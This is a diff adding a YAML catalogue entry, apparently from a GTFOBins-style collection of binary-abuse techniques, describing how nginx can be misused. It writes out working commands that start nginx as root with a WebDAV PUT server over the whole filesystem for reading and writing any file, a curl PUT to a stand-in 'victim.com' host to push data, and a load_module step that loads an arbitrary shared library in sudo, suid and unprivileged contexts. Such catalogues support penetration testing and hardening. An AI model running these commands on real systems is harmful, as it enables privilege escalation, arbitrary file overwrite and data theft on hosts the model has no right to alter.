@@ -1,0 +1,58 @@
+---
+functions:
+  download:
+  - code: |-
+      cat >/path/to/temp-file <<EOF
+      user root;
+      http {
+        server {
+          listen 80;
+          root /;
+          autoindex on;
+          dav_methods PUT;
+        }
+      }
+      events {}
+      EOF
+
+      nginx -c /path/to/temp-file
+    contexts:
+      sudo:
+    sender:
+      code: |-
+        curl -X PUT victim.com/path/to/output-file --data-binary @/path/to/input-file
+      comment: |-
+        An HTTP client can be used on the attacker box to send the data.
+  library-load:
+  - code: |-
+      cat >/path/to/temp-file <<EOF
+      load_module /path/to/lib.so
+      EOF
+
+      nginx -t -c /path/to/temp-file
+    comment: |-
+      Alternatively, the `ssl_engine` directive can be used.
+    contexts:
+      sudo:
+      suid:
+      unprivileged:
+  upload:
+  - code: |-
+      cat >/path/to/temp-file <<EOF
+      user root;
+      http {
+        server {
+          listen 80;
+          root /;
+          autoindex on;
+          dav_methods PUT;
+        }
+      }
+      events {}
+      EOF
+
+      nginx -c /path/to/temp-file
+    contexts:
+      sudo:
+    receiver: http-client
+...
